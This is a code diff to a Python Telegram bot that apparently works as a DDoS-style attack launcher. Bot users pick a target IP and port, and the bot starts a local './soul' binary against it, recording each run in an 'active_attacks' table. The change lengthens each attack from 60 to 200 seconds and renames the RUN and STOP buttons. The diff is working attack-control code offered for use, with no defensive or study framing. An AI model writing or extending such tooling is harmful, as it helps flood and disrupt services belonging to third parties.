@@ -19,7 +19,7 @@ if os.path.exists('./soul'):
 def runcommand_sync(user_id, target_ip, target_port, action):
     try:
         if action == 1:
-            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "60"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(["./soul", target_ip, str(target_port), "1", "200"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             active_attacks[(user_id, target_ip, target_port)] = process.pid
         elif action == 2:
             pid = active_attacks.pop((user_id, target_ip, target_port), None)
@@ -35,10 +35,10 @@ def send_main_buttons(chat_id, action):
         markup.add(KeyboardButton("Lest Go ⚠️"))
         bot.send_message(chat_id, "Main Menu:", reply_markup=markup)
     elif action == 1:
-        markup.add(KeyboardButton("Start ✅ 🚀"))
+        markup.add(KeyboardButton("RUN ✅ 🚀"))
         bot.send_message(chat_id, "Target set. Ready to start:", reply_markup=markup)
     elif action == 2:
-        markup.add(KeyboardButton("Stop ❌"))
+        markup.add(KeyboardButton("STOP ❌"))
         bot.send_message(chat_id, "Process running:", reply_markup=markup)
 
 @bot.message_handler(func=lambda message: message.text == "Lest Go ⚠️")
@@ -66,7 +66,7 @@ def process_ip_port(message):
         bot.reply_to(message, "*Wrong format*", parse_mode="Markdown")
         send_main_buttons(message.chat.id, 0)
 
-@bot.message_handler(func=lambda message: message.text == "Start ✅ 🚀")
+@bot.message_handler(func=lambda message: message.text == "RUN ✅ 🚀")
 def start(message):
     details = userdetails.get(message.from_user.id)
     if details:
@@ -78,7 +78,7 @@ def start(message):
         bot.reply_to(message, "*No target specified.*", parse_mode="Markdown")
         send_main_buttons(message.chat.id, 0)
         
-@bot.message_handler(func=lambda message: message.text == "Stop ❌")
+@bot.message_handler(func=lambda message: message.text == "STOP ❌")
 def stop(message):
     details = userdetails.get(message.from_user.id)
     if details:
